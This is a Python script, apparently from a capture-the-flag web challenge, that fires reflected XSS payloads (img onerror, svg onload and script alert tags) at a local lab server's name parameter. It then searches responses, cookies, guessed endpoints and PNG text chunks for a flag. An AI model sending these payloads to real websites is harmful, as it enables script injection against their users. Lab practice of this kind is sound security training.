import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:32955"
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)

# The page has a form field name="name", maybe submitting it processes something
print("[+] Testing form submission with GET...")

# Try submitting via GET with the name parameter (matching form field)
working_payloads = [
    "<img src=x onerror=top.alert('XSS')>",
    "<svg onload=top.alert('XSS')>",
]

for payload in working_payloads:
    # Build the full request URL
    url = f"{base_url}/page?name={urllib.parse.quote(payload)}"
    print(f"\n[+] URL: {url}")
    
    resp = requests.get(url)
    print(f"Status: {resp.status_code}")
    print(f"Cookies: {resp.cookies.get_dict()}")
    
    # Check set-cookie headers
    if 'Set-Cookie' in resp.headers:
        print(f"Set-Cookie header: {resp.headers['Set-Cookie']}")
    
    # Check response body for flags
    flags = flag_pattern.findall(resp.text)
    if flags:
        print(f"[!] FLAG FOUND: {flags}")
    
    # Check if payload is in response
    if payload in resp.text:
        print("[+] Payload reflected (unencoded)")
    elif urllib.parse.quote(payload) in resp.text:
        print("[+] Payload reflected (URL encoded)")
    
    # Print response body to analyze
    print(f"\nResponse body:\n{resp.text}")
    print("=" * 60)

print("\n[+] Looking for flag in cookie after XSS-like interaction...")

# Maybe need to check different cookie-related endpoints
cookie_endpoints = [
    "/",
    "/page",
    "/cookies",
    "/flag",
    "/get_flag",
]

# First, send a payload
url = f"{base_url}/page?name={urllib.parse.quote('<img src=x onerror=alert(1)>')}"
resp1 = requests.get(url)
print(f"Step 1 - Payload sent, cookies: {resp1.cookies.get_dict()}")

# Then, check the same page and see if anything changed
resp2 = requests.get(f"{base_url}/page", cookies=resp1.cookies)
print(f"Step 2 - Checking page with cookies: {resp2.cookies.get_dict()}")
flags = flag_pattern.findall(resp2.text)
if flags:
    print(f"[!] FLAG after step 2: {flags}")

# Try checking with session persistence
session = requests.Session()

# Send XSS payload
session.get(url)
print(f"Step 3 - Session cookies: {session.cookies.get_dict()}")

# Check various endpoints with the same session
for endpoint in cookie_endpoints:
    resp = session.get(f"{base_url}{endpoint}")
    flags = flag_pattern.findall(resp.text)
    if flags:
        print(f"[!] FLAG at {endpoint}: {flags}")

print("\n[+] Checking if flag is set as cookie after XSS...")

# Create new session
session2 = requests.Session()

# Send request with XSS payload
xss_url = f"{base_url}/page?name=<script>alert(1)</script>"
resp = session2.get(xss_url)
print(f"Cookies after XSS request: {session2.cookies.get_dict()}")
print(f"Response headers: {dict(resp.headers)}")

# Check specifically for flag in cookies
cookies = session2.cookies.get_dict()
for key, value in cookies.items():
    flags = flag_pattern.findall(value)
    if flags:
        print(f"[!] FLAG in cookie '{key}': {flags}")
    if 'flag' in key.lower():
        print(f"[+] Cookie named 'flag' found: {key}={value}")

print("\n" + "=" * 60)
print("[+] Checking PNG text chunks for hidden flag...")

# Get the new_star.png file
resp_png = requests.get(f"{base_url}/static/img/cookies/new_star.png")
print(f"PNG size: {len(resp_png.content)} bytes")

# Parse PNG chunks
content = resp_png.content
pos = 8  # Skip PNG signature
while pos < len(content) - 8:
    try:
        length = int.from_bytes(content[pos:pos+4], 'big')
        chunk_type = content[pos+4:pos+8].decode('ascii', errors='ignore')
        chunk_data = content[pos+8:pos+8+length]
        
        if chunk_type in ['tEXt', 'iTXt', 'zTXt']:
            try:
                text = chunk_data.decode('latin-1', errors='ignore')
                print(f"\n[+] {chunk_type} chunk found:")
                print(f"    Content: {text[:200]}")
                flags = flag_pattern.findall(text)
                if flags:
                    print(f"    [!] FLAG: {flags}")
            except:
                pass
        
        pos += 8 + length + 4  # Move to next chunk
        if length < 0 or length > 10000000:  # Safety check
            break
    except:
        break

print("\n[+] Testing complete - need to re-check strategy")

